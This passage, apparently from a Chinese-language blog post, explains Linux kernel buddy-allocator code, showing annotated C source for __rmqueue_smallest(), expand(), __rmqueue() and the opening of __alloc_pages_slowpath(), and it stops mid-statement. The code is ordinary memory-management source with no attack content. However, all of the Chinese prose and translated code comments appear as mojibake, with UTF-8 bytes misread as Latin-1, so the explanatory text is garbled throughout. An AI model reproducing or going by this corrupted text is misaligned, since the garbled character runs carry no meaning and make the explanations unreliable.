é“¾è¡¨è„±é“¾æ“ä½œå®Œæˆçš„ï¼Œè€Œæ‹†é«˜é˜¶ page çš„æ“ä½œåˆ™æ˜¯é€šè¿‡ <code>expand()</code> å®Œæˆçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¯¹ç»™å®šçš„ migrationtype éå† free lists </span><br><span class="hljs-comment"> * å¹¶ä» freelists ä¸Šç§»é™¤æœ€å°å¯ç”¨çš„é¡µé¢</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">rmqueue_smallest</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>,</span><br><span class="hljs-class"><span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> current_order;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span> *<span class="hljs-title">area</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-comment">/* åœ¨ preferred list ä¸Šå¯»æ‰¾ä¸€ä¸ªåˆé€‚ size çš„ page */</span><br><span class="hljs-keyword">for</span> (current_order = order; current_order &lt; MAX_ORDER; ++current_order) &#123;<br>area = &amp;(zone-&gt;free_area[current_order]);<br>page = get_page_from_free_area(area, migratetype);<br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">continue</span>;<br>del_page_from_free_list(page, zone, current_order);<br>expand(zone, page, order, current_order, migratetype);<br>set_pcppage_migratetype(page, migratetype);<br><span class="hljs-keyword">return</span> page;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>expand()</code> çš„é€»è¾‘å°±æ¯”è¾ƒç®€å•ï¼Œä»é«˜é˜¶ order ä¸€ç›´å¾ªç¯åˆ°å¾…åˆ†é…çš„ orderï¼š</p><ul><li>é¦–å…ˆé«˜é˜¶ orderâ€“ï¼Œä¹‹åé¡µé¢æ‹†ä¸¤åŠï¼ŒæŠŠååŠéƒ¨åˆ†æŒ‚åˆ°é“¾è¡¨ä¸Šï¼Œå‰åŠéƒ¨åˆ†ç•™åˆ°ä¸‹æ¬¡å¾ªç¯ç»§ç»­æ‹†</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ­¤å¤„å†åˆ†å‰²çš„é¡ºåºå¯¹ IO subsystem è€Œè¨€æ˜¯ååˆ†é‡è¦çš„.</span><br><span class="hljs-comment"> * è¯·ä¸è¦åœ¨æœ‰å¥½çš„ç†ç”±åŠå›å½’æµ‹è¯•å‰æ”¹å˜è¿™ä¸ªé¡ºåºã€‚</span><br><span class="hljs-comment"> * ç‰¹åˆ«åœ°ï¼Œå½“å¤§å—çš„å†…å­˜è¢«åˆ†å‰²ï¼Œæ›´å°å—ï¼ˆå†…å­˜ï¼‰è¢«ä¼ é€’çš„é¡ºåº</span><br><span class="hljs-comment"> * åˆ™ç”±ä»–ä»¬åœ¨è¯¥å‡½æ•°ä¸­è¢«åˆ†å‰²çš„é¡ºåºå†³å®šã€‚</span><br><span class="hljs-comment"> * æ ¹æ®å®é™…æµ‹è¯•ï¼Œè¿™æ˜¯å½±å“ä¼ é€’ç»™IOå­ç³»ç»Ÿçš„ pages é¡ºåºçš„ä¸»è¦å› ç´ ï¼Œ</span><br><span class="hljs-comment"> * è€ƒè™‘åˆ°åŒ…å«ä¸€ä¸ªå†…å­˜å¤§å—ï¼ˆç”±ä¸€ç³»åˆ—å°çš„åˆ†é…ä½œç”¨ï¼‰çš„ buddy system çš„è¡Œä¸ºï¼Œ</span><br><span class="hljs-comment"> * è¿™ä¹Ÿæ˜¯åˆç†çš„ã€‚è¿™ç§è¡Œä¸ºæ˜¯ sglist åˆå¹¶æˆåŠŸçš„å…³é”®å› ç´ ã€‚</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * -- nyc</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">expand</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> zone *zone, <span class="hljs-keyword">struct</span> page *page,</span><br><span class="hljs-params"><span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high, <span class="hljs-type">int</span> migratetype)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> size = <span class="hljs-number">1</span> &lt;&lt; high;<br><br><span class="hljs-keyword">while</span> (high &gt; low) &#123;<br>high--;<br>size &gt;&gt;= <span class="hljs-number">1</span>;<br>VM_BUG_ON_PAGE(bad_range(zone, &amp;page[size]), &amp;page[size]);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ ‡è®°ä¸º guard pages (æˆ– page), è¿™å°†å…è®¸åœ¨ buddy å°†è¢«</span><br><span class="hljs-comment"> * é‡Šæ”¾æ—¶åˆå¹¶å›åˆ†é…å™¨.å¯¹åº”çš„é¡µè¡¨é¡¹ä¸ä¼šè¢«åˆ›å»ºï¼Œ</span><br><span class="hljs-comment"> * pages åœ¨ è™šæ‹Ÿåœ°å€ç©ºé—´ä¸Šä»å°†ä¿æŒä¸å­˜åœ¨ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (set_page_guard(zone, &amp;page[size], high, migratetype))<br><span class="hljs-keyword">continue</span>;<br><br>add_to_free_list(&amp;page[size], zone, high, migratetype);<br>set_buddy_order(&amp;page[size], high);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="â‘¢-rmqueue-ï¼šåˆ†é…å°è£…å‡½æ•°"><a href="#â‘¢-rmqueue-ï¼šåˆ†é…å°è£…å‡½æ•°" class="headerlink" title="â‘¢ __rmqueue()ï¼šåˆ†é…å°è£…å‡½æ•°"></a>â‘¢ __rmqueue()ï¼šåˆ†é…å°è£…å‡½æ•°</h5><p>è¿™ä¸ªå‡½æ•°å…¶å®ä¸»è¦æ˜¯å¯¹å…¶ä»–åˆ†é…å‡½æ•°çš„å°è£…ï¼Œæœ€ç»ˆçš„æ ¸å¿ƒå‡½æ•°å…¶å®éƒ½è¿˜æ˜¯ <code>__rmqueue_smallest()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä» buddy allocator ä¸Šç§»é™¤ä¸€ä¸ªå…ƒç´ .</span><br><span class="hljs-comment"> * åœ¨æŒæœ‰ zone-&gt;lock æ—¶è°ƒç”¨.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">rmqueue</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>, <span class="hljs-title">int</span> <span class="hljs-title">migratetype</span>,</span><br><span class="hljs-class"><span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_CMA)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é€šè¿‡å½“åŠæ•°ç©ºé—²å†…å­˜åœ¨ CMA åŒºåŸŸæ—¶ä» CMA ä¸­åˆ†é…</span><br><span class="hljs-comment"> * ä»¥å¹³è¡¡å¸¸è§„çš„ä¸CMAåŒºåŸŸçš„å¯è¿ç§»çš„åˆ†é…ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_CMA &amp;&amp;<br>    zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;<br>    zone_page_state(zone, NR_FREE_PAGES) / <span class="hljs-number">2</span>) &#123;<br>page = __rmqueue_cma_fallback(zone, order);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br>retry:<br>page = __rmqueue_smallest(zone, order, migratetype);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_CMA)<br>page = __rmqueue_cma_fallback(zone, order);<br><br><span class="hljs-keyword">if</span> (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,<br>alloc_flags))<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>out:<br><span class="hljs-keyword">if</span> (page)<br>trace_mm_page_alloc_zone_locked(page, order, migratetype);<br><span class="hljs-keyword">return</span> page;<br>&#125;<br></code></pre></td></tr></table></figure><p>æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>è‹¥å¼€å¯äº† CMAï¼Œæ¯”å¯¹å¸¸è§„åŒºåŸŸä¸ CMA åŒºåŸŸçš„ç©ºé—²é¡µé¢æ•°é‡ï¼Œè‹¥ CMA çš„å¤šåˆ™è°ƒç”¨ <code>__rmqueue_cma_fallback()</code> ä» CMA åŒºåŸŸåˆ†é…ï¼ˆå…¶å®å°±æ˜¯è°ƒç”¨ <code>__rmqueue_smallest()</code> ä»è¿ç§»ç±»å‹ä¸º <code>MIGRATE_CMA</code> çš„é“¾è¡¨ä¸Šåˆ†é…ï¼‰ï¼ŒæˆåŠŸåˆ™ç›´æ¥è¿”å›</li><li>è°ƒç”¨ <code>__rmqueue_smallest()</code> ä»æŒ‡å®šè¿ç§»ç±»å‹é“¾è¡¨è¿›è¡Œåˆ†é…ï¼Œè‹¥æœªæˆåŠŸï¼š<ul><li>è‹¥è®¾ç½®äº† <code>ALLOC_CMA</code> çš„åˆ†é… flagï¼Œè°ƒç”¨ <code>__rmqueue_cma_fallback()</code> ä» CMA åŒºåŸŸè¿›è¡Œåˆ†é…</li><li>è‹¥ä¸Šä¸€æ­¥å¤±è´¥åˆ™è°ƒç”¨ <code>__rmqueue_fallback()</code> å°è¯•ä»å…¶ä»–è¿ç§»ç±»å‹é“¾è¡¨è·å–é¡µé¢ï¼Œè‹¥è¿˜æ˜¯å¤±è´¥åˆ™é‡è¯•è¿™ä¸€ä¸ªå¤§æ­¥éª¤</li></ul></li></ul><h3 id="III-alloc-pages-slowpath-ï¼šæ…¢é€Ÿåˆ†é…è·¯å¾„"><a href="#III-alloc-pages-slowpath-ï¼šæ…¢é€Ÿåˆ†é…è·¯å¾„" class="headerlink" title="III. __alloc_pages_slowpath()ï¼šæ…¢é€Ÿåˆ†é…è·¯å¾„"></a>III. __alloc_pages_slowpath()ï¼šæ…¢é€Ÿåˆ†é…è·¯å¾„</h3><p>å½“å¿«é€Ÿè·¯å¾„çš„åˆ†é…ä¸æˆåŠŸæ—¶ï¼Œè¯´æ˜ç³»ç»Ÿå½“å‰å¯èƒ½å·²ç»æ²¡æœ‰è¶³å¤Ÿçš„è¿ç»­çš„ç©ºé—²é¡µé¢ï¼Œè¿™æ—¶æˆ‘ä»¬å°±è¦è¿›å…¥åˆ°æ…¢é€Ÿè·¯å¾„çš„åˆ†é…ï¼Œ<strong>è¿›è¡Œå†…å­˜ç¢ç‰‡æ•´ç†ä¸å†…å­˜å›æ”¶</strong>ï¼Œä¹‹åå†è¿›è¡Œåˆ†é…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">alloc_pages_slowpath</span>(<span class="hljs-title">gfp_t</span> <span class="hljs-title">gfp_mask</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>,</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> *<span class="hljs-title">ac</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">bool</span> can_direct_reclaim = gfp_mask &amp; __GFP_DIRECT_RECLAIM;<br><span class="hljs-type">const</span> <span class="hljs-type">bool</span> costly_order = order &gt; PAGE_ALLOC_COSTLY_ORDER;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> did_some_progress;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">compact_priority</span> <span class="hljs-title">compact_priority</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">compact_result</span> <span class="hljs-title">compact_result</span>;</span><br><span class="hljs-type">int</span> compaction_retries;<br><span class="hljs-type">int</span> no_progress_loops;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpuset_mems_cookie;<br><span class="hljs-type">int</span> reserve_flags;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬è¿˜è¿›è¡Œäº†å¥å…¨æ€§æ£€æŸ¥ï¼Œä»¥å‘ç°éåŸå­ä¸Šä¸‹æ–‡ä¸­çš„ caller æ»¥ç”¨åŸå­å‚¨å¤‡ï¼ˆçš„è¡Œä¸ºï¼‰ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE((gfp_mask &amp; (__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)) ==<br>(__GFP_ATOMIC|__GFP_DIRECT_RECLAIM)))<br>gfp_mask &amp;= ~__GFP_ATOMIC;<br><br>retry_cpuset:<br>compaction_retries = <span class="hljs-number">0</span>;<br>no_progress_loops = <span class="hljs-number">0</span>;<br>compact_priority = DEF_COMPACT_PRIORITY;<br>cpuset_mems_cookie = read_mems_allowed_begin();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä»…åœ¨ kswapd éœ€è¦è¢«å”¤é†’å‰ï¼Œå¿«é€Ÿè·¯å¾„ä½¿ç”¨ä¿å®ˆçš„ alloc_flags æ‰èƒ½æˆåŠŸï¼Œ</span><br><span class="hljs-comment"> * å¹¶ä¸”é¿å…ç²¾ç¡®åœ°è®¾ç½® alloc_flagsã€‚ æ‰€ä»¥æˆ‘ä»¬ç°åœ¨è¿™ä¹ˆåšã€‚</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">// é‡æ–°è®¾ç½® alloc_flagsï¼Œå› ä¸ºå¿«é€Ÿè·¯å¾„çš„åˆ†é…åœ¨ kswapd è¢«å”¤é†’ä¹‹å‰</span><br>    <span class="hljs-comment">// åªæœ‰ä½¿ç”¨ä¿å®ˆçš„ alloc_flags æ‰èƒ½æˆåŠŸï¼Œè€Œç°åœ¨æˆ‘ä»¬å°†å”¤é†’ kswapdï¼Œ</span><br>    <span class="hljs-comment">// å› æ­¤æ¢å¤ä½¿ç”¨åŸæœ‰çš„ gfp_mask å¯¹åº”çš„ alloc_flags</span><br>alloc_flags = gfp_to_alloc_flags(gfp_mask);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬éœ€è¦ä¸º zonelist è¿­ä»£å™¨é‡æ–°è®¡ç®—èµ·å§‹ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬å¯èƒ½åœ¨å¿«é€Ÿè·¯å¾„ä¸­</span><br><span class="hljs-comment"> * ä½¿ç”¨äº†ä¸åŒçš„ nodemask ï¼Œæˆ–æ˜¯æœ‰ä¸ª cpuset çš„ä¿®æ”¹è€Œæˆ‘ä»¬æ­£åœ¨é‡è¯•</span><br><span class="hljs-comment"> * - å¦åˆ™æˆ‘ä»¬å¯èƒ½ä¼šæ— ä¼‘æ­¢åœ°è¿­ä»£ä¸åˆæ ¼çš„ zone</span><br><span class="hljs-comment"> */</span><br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br><span class="hljs-keyword">if</span> (!ac-&gt;preferred_zoneref-&gt;zone)<br><span class="hljs-keyword">goto</span> nopage;<br><br>    <span class="hljs-comment">// å¦‚æœ ALLOC_KSWAPDï¼Œå”¤é†’ kswapd çº¿ç¨‹å›æ”¶å†…å­˜</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)<br>wake_all_kswapds(order, gfp_mask, ac);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è°ƒæ•´åçš„ alloc_flags å¯èƒ½ä¼šç«‹å³æˆåŠŸï¼Œæ‰€ä»¥å…ˆè¿›è¡Œå°è¯•</span><br><span class="hljs-comment"> */</span><br>page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¯¹äºä»£ä»·é«˜çš„åˆ†é…, é¦–å…ˆå°è¯•ç›´æ¥çš„ compactionï¼ˆè¯‘æ³¨ï¼šç¢ç‰‡æ•´ç†æœºåˆ¶ï¼‰,</span><br><span class="hljs-comment"> * å› ä¸ºæœ‰å¯èƒ½æˆ‘ä»¬ä»æœ‰è¶³å¤Ÿçš„åŸºæœ¬é¡µé¢ï¼Œå¹¶ä¸éœ€è¦å»å›æ”¶. å¯¹äºä¸å¯è¿ç§»çš„é«˜é˜¶åˆ†é…ï¼Œ</span><br><span class="hljs-comment"> * åŒæ ·è¿™ä¹ˆåš, å› ä¸º compaction å°†å°è¯•é€šè¿‡ä»ç›¸åŒè¿ç§»ç±»å‹çš„å—è¿›è¡Œè¿ç§»</span><br><span class="hljs-comment"> * ä»¥é¿å…æ°¸ä¹…çš„ç¢ç‰‡. åˆ«å¯¹å…è®¸å¿½è§†æ°´ä½çº¿çš„åˆ†é…å°è¯•è¿™ä¸ªï¼Œå› ä¸º</span><br><span class="hljs-comment"> * ALLOC_NO_WATERMARKS è¿˜æ²¡å‘ç”Ÿã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (can_direct_reclaim &amp;&amp;<br>(costly_order ||<br>   (order &gt; <span class="hljs-number">0</span> &amp;&amp; ac-&gt;migratetype != MIGRATE_MOVABLE))<br>&amp;&amp; !gfp_pfmemalloc_allowed(gfp_mask)) &#123;<br>page = __alloc_pages_direct_compact(gfp_mask, order,<br>alloc_flags, ac,<br>INIT_COMPACT_PRIORITY,<br>&amp;compact_result);<br><span class="hljs-keyword">if</span> (page)<br><span class="hljs-keyword">goto</span> got_pg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ£€æŸ¥å¸¦æœ‰ __GFP_NORETRY çš„ä»£ä»·é«˜çš„åˆ†é…, å…¶</span><br><span class="hljs-comment"> * åŒ…æ‹¬ä¸€äº› THP page fault çš„åˆ†é…</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (costly_order &amp;&amp; (gfp_mask &amp; __GFP_NORETRY)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‹¥åˆ†é…æ•´ä¸ª pageblock(s) ä¸” compaction ç”±äºæ‰€æœ‰çš„ zone</span><br><span class="hljs-comment"> * éƒ½åœ¨æ°´ä½çº¿ä¸‹å¤±è´¥äº†ï¼Œæˆ–æ˜¯è¢«ç¦æ­¢äº†å› ä¸ºå…¶æœ€è¿‘åœ¨è¯¥orderä¸Šå¤±è´¥äº†ï¼Œ</span><br><span class="hljs-comment"> * é™¤éåˆ†é…å™¨æœ‰è¯·æ±‚çš„ compaction ä¸å›æ”¶å°è¯•ï¼Œå¦åˆ™ç›´æ¥å¤±è´¥</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å›æ”¶æ˜¯ï¼š</span><br><span class="hljs-comment"> *  - å¯èƒ½éå¸¸æ˜‚è´µå› ä¸º zones å¯èƒ½è¿œä½äºä»–ä»¬çš„ä½æ°´ä½çº¿ï¼Œ</span><br><span class="hljs-comment"> *    æˆ–æ˜¯è¿™æ˜¯éå¸¸çªå‘çš„é«˜é˜¶åˆ†é…çš„ä¸€éƒ¨åˆ†,</span><br><span class="hljs-comment"> *  - ä¸ä¸€å®šä¼šæœ‰å¸®åŠ©å› ä¸º isolate_freepages() å¯èƒ½ä¸ä¼šåœ¨</span><br><span class="hljs-comment"> *    è¢«é‡Šæ”¾çš„é¡µé¢ä¸Šè¿­ä»£ä½œä¸ºå…¶çº¿æ€§æ‰«æçš„ä¸€éƒ¨åˆ†ï¼Œä¸”</span><br><span class="hljs-comment"> *  - ä¸å¤§å¯èƒ½ä¼šè®©æ•´ä¸ª pageblocks è‡ªå·±é‡Šæ”¾</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (compact_result == COMPACT_SKIPPED ||<br>    compact_result == COMPACT_DEFERRED)<br><span class="hljs-keyword">goto</span> nopage;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * çœ‹èµ·æ¥å¥½åƒ reclaim/compaction æ˜¯å€¼å¾—å°è¯•çš„, ä½†</span><br><span class="hljs-comment"> * åŒæ­¥çš„ compaction å¯èƒ½ä¼šéå¸¸ expensive, æ•…ä¿æŒ</span><br><span class="hljs-comment"> * ä½¿ç”¨å¼‚æ­¥çš„ compaction.</span><br><span class="hljs-comment"> */</span><br>compact_priority = 